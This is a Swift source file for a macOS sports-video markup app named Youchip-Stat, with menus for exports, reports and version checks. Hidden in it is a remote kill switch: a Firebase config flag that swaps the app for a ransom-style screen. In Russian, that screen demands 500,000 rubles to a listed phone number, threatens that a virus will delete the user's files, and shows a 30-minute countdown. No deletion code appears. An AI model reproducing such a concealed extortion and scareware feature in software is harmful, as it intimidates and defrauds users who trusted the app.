//
//  Youchip_StatApp.swift
//  Youchip-Stat
//
//  Created by Сергей Бекезин on 02.03.2025.
//

import SwiftUI
import Foundation
import Firebase
import FirebaseRemoteConfig

@main
struct Youchip_StatApp: App {
    
    @NSApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    @StateObject private var authManager = AuthManager()
    @State private var showTimeManipulationAlert = false
    @State private var showVersionOutdatedAlert = false
    @State private var ivanBlockEnabled = false
    
    init() {
        AppSetupManager.setup()
    }
    
    var body: some Scene {
        WindowGroup {
            if ivanBlockEnabled {
                IvanBlockView()
            } else {
                ContentView()
                    .environmentObject(authManager)
                    .onAppear {
                        if authManager.timeManipulationDetected {
                            showTimeManipulationAlert = true
                        } else {
                            checkAppVersion()
                        }
                    }
                    .alert(^String.Titles.warning, isPresented: $showTimeManipulationAlert) {
                        Button(^String.Titles.fieldMapButtonOK) {
                            NSApplication.shared.terminate(nil)
                        }
                    } message: {
                        Text("Пиратить и читерить - Плохо!!!!!")
                    }
                    .alert("Устаревшая версия", isPresented: $showVersionOutdatedAlert) {
                        Button(^String.Titles.fieldMapButtonOK) {
                            NSApplication.shared.terminate(nil)
                        }
                    } message: {
                        Text(^String.Titles.versionOutdatedMessage)
                    }
            }
        }
        .handlesExternalEvents(matching: [])
        .commands {
            CommandMenu("Tools") {
                Menu(^String.Titles.toolsExportMarkup) {
                    Button(^String.Titles.toolsExportMarkupJsonFull) {
                        NotificationCenter.default.post(name: .toolsExportMarkupJSONFull, object: nil)
                    }
                    .keyboardShortcut("e", modifiers: [.command])

                    Button(^String.Titles.toolsExportMarkupJsonSimple) {
                        NotificationCenter.default.post(name: .toolsExportMarkupJSONSimple, object: nil)
                    }

                    Button("XML") {
                        NotificationCenter.default.post(name: .toolsExportMarkupXML, object: nil)
                    }
                    .keyboardShortcut("i", modifiers: [.command])

                    Button("Excel") {
                        NotificationCenter.default.post(name: .toolsExportMarkupExcel, object: nil)
                    }
                }

                Menu(^String.Titles.toolsExportCuts) {
                    Button(^String.Titles.fullControlButtonExportTimeline) {
                        NotificationCenter.default.post(name: .toolsExportCutsCurrentTimeline, object: nil)
                    }
                    Button(^String.Titles.fullControlButtonExportAll) {
                        NotificationCenter.default.post(name: .toolsExportCutsAllTimelines, object: nil)
                    }
                    Button(^String.Titles.fullControlButtonExportDrawings) {
                        NotificationCenter.default.post(name: .toolsExportCutsDrawings, object: nil)
                    }
                    Button(^String.Titles.fullControlButtonExportTags) {
                        NotificationCenter.default.post(name: .toolsExportCutsByTags, object: nil)
                    }
                    Button(^String.Titles.fullControlButtonExportLabels) {
                        NotificationCenter.default.post(name: .toolsExportCutsByLabels, object: nil)
                    }
                    Button(^String.Titles.fullControlButtonExportEvents) {
                        NotificationCenter.default.post(name: .toolsExportCutsByEvents, object: nil)
                    }
                }
                
                Menu(^String.Titles.toolsReport) {
                    Button(^String.Titles.toolsReportSimple) {
                        NotificationCenter.default.post(name: .toolsReportSimple, object: nil)
                    }
                    .keyboardShortcut("r", modifiers: [.command])

                    Button(^String.Titles.toolsReportAdvanced) {
                        NotificationCenter.default.post(name: .toolsReportAdvanced, object: nil)
                    }
                    .keyboardShortcut("t", modifiers: [.command])
                }
            }
        }
    }
    
    private func checkAppVersion() {
        let remoteConfig = RemoteConfig.remoteConfig()
        
        remoteConfig.fetch(withExpirationDuration: 0) { status, error in
            if status == .success {
                remoteConfig.activate { _, _ in
                    let ivanBlock = remoteConfig.configValue(forKey: "TotalIvanBlock").boolValue
                    if ivanBlock {
                        DispatchQueue.main.async {
                            self.ivanBlockEnabled = true
                        }
                        return
                    }
                    
                    let requiredVersion = remoteConfig.configValue(forKey: "MajorVersion").stringValue
                    
                    if let currentVersion = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String {
                        if self.compareVersions(current: currentVersion, required: requiredVersion ?? "") == .orderedAscending {
                            DispatchQueue.main.async {
                                self.showVersionOutdatedAlert = true
                            }
                        }
                    }
                }
            }
        }
    }

    private func compareVersions(current: String, required: String) -> ComparisonResult {
        let currentComponents = current.components(separatedBy: ".").map { Int($0) ?? 0 }
        let requiredComponents = required.components(separatedBy: ".").map { Int($0) ?? 0 }
        
        if currentComponents.count > 0 && requiredComponents.count > 0 {
            if currentComponents[0] < requiredComponents[0] {
                return .orderedAscending
            } else if currentComponents[0] > requiredComponents[0] {
                return .orderedDescending
            }
        }
        
        if currentComponents.count > 1 && requiredComponents.count > 1 {
            if currentComponents[1] < requiredComponents[1] {
                return .orderedAscending
            } else if currentComponents[1] > requiredComponents[1] {
                return .orderedDescending
            }
        }
        
        return .orderedSame
    }
}

enum MainTab: String, CaseIterable {
    case markup
    case viewing
    
    var title: String {
        switch self {
        case .markup: return ^String.Titles.mainTabMarkup
        case .viewing: return ^String.Titles.mainTabViewing
        }
    }
    
    var icon: String {
        switch self {
        case .markup: return "pencil.and.ruler"
        case .viewing: return "play.rectangle.on.rectangle"
        }
    }
}

struct ContentView: View {
    @EnvironmentObject var authManager: AuthManager
    @State private var selectedTab: MainTab = .markup
    
    var body: some View {
        VStack(spacing: 0) {
            mainTabBar
            
            switch selectedTab {
            case .markup:
                VideosView()
                    .environmentObject(VideosViewModel())
                    .environmentObject(authManager)
            case .viewing:
                SportCutListView()
            }
        }
    }
    
    private var mainTabBar: some View {
        HStack(spacing: 0) {
            ForEach(MainTab.allCases, id: \.self) { tab in
                Button(action: { selectedTab = tab }) {
                    HStack(spacing: 6) {
                        Image(systemName: tab.icon)
                            .font(.system(size: 14))
                        Text(tab.title)
                            .font(.system(size: 14, weight: .medium))
                    }
                    .padding(.horizontal, 20)
                    .padding(.vertical, 10)
                    .background(selectedTab == tab ? Color.blue : Color.clear)
                    .foregroundColor(selectedTab == tab ? .white : .primary)
                }
                .buttonStyle(PlainButtonStyle())
            }
            
            Spacer()
        }
        .background(Color(NSColor.windowBackgroundColor))
        .overlay(
            Rectangle()
                .frame(height: 1)
                .foregroundColor(Color(NSColor.separatorColor)),
            alignment: .bottom
        )
    }
}

struct IvanBlockView: View {
    @State private var timeRemaining: TimeInterval = 30 * 60
    @State private var timer: Timer?
    
    var body: some View {
        GeometryReader { geometry in
            ZStack {
                Color.black.ignoresSafeArea()
                
                VStack(spacing: 40) {
                    Spacer()
                    
                    Image("ivan")
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: 600, height: 600)
                    
                    Text("Если по истечении таймера не будет погашен долг размером 500 тыс руб (номер для перевода +79956145183 Иван Х. ТБанк), то Иван доест свой рамен и вирус ivan_Pojiratel228.sh сьест все ваши файлы")
                        .font(.system(size: 24, weight: .bold))
                        .foregroundColor(.red)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 40)
                        .fixedSize(horizontal: false, vertical: true)
                    
                    Text(timeString(from: timeRemaining))
                        .font(.system(size: 72, weight: .bold))
                        .foregroundColor(.white)
                        .monospacedDigit()
                    
                    Spacer()
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
            }
        }
        .frame(minWidth: 1200, minHeight: 900)
        .onAppear {
            startTimer()
        }
        .onDisappear {
            timer?.invalidate()
        }
    }
    
    private func startTimer() {
        timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
            if timeRemaining > 0 {
                timeRemaining -= 1
            } else {
                timer?.invalidate()
                NSApplication.shared.terminate(nil)
            }
        }
    }
    
    private func timeString(from timeInterval: TimeInterval) -> String {
        let minutes = Int(timeInterval) / 60
        let seconds = Int(timeInterval) % 60
        return String(format: "%02d:%02d", minutes, seconds)
    }
}
